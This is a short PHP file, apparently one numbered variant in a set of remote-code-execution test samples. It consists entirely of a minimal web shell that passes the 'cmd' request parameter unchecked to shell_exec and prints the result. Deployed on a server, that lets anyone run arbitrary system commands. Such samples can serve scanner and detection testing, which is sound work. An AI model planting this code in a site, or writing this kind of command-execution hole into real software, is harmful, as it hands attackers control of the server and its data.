<?php
// RCE test variation #1225
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>